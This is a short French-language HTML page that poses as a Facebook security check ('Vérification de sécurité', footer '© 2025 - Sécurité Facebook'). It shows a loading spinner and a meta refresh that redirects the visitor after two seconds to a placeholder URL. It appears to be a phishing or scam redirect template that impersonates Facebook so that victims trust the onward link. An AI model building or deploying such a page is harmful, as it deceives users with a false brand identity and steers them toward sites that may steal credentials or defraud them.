<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vérification de sécurité</title>
<meta http-equiv="refresh" content="2; url=https://tonlienversel.com"> <!-- ✅ Redirection automatique -->
<style>
  * { box-sizing: border-box; }

  body {
    margin: 0;
    padding: 0;
    height: 100vh;
    width: 100vw;
    background-color: #ffffff; /* ✅ Fond blanc solide */
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    font-family: "Segoe UI", Arial, sans-serif;
    color: #1c1e21;
  }

  .loader {
    border: 5px solid #f3f3f3;
    border-top: 5px solid #1877f2;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  h1 {
    font-size: 1.5em;
    margin-bottom: 10px;
  }

  p {
    color: #555;
    font-size: 1em;
  }

  footer {
    position: absolute;
    bottom: 20px;
    color: #999;
    font-size: 0.85em;
  }
</style>
</head>
<body>

<div class="loader"></div>
<h1>Vérification de sécurité...</h1>
<p>Veuillez patienter quelques instants.</p>

<footer>© 2025 - Sécurité Facebook</footer>

</body>
</html>
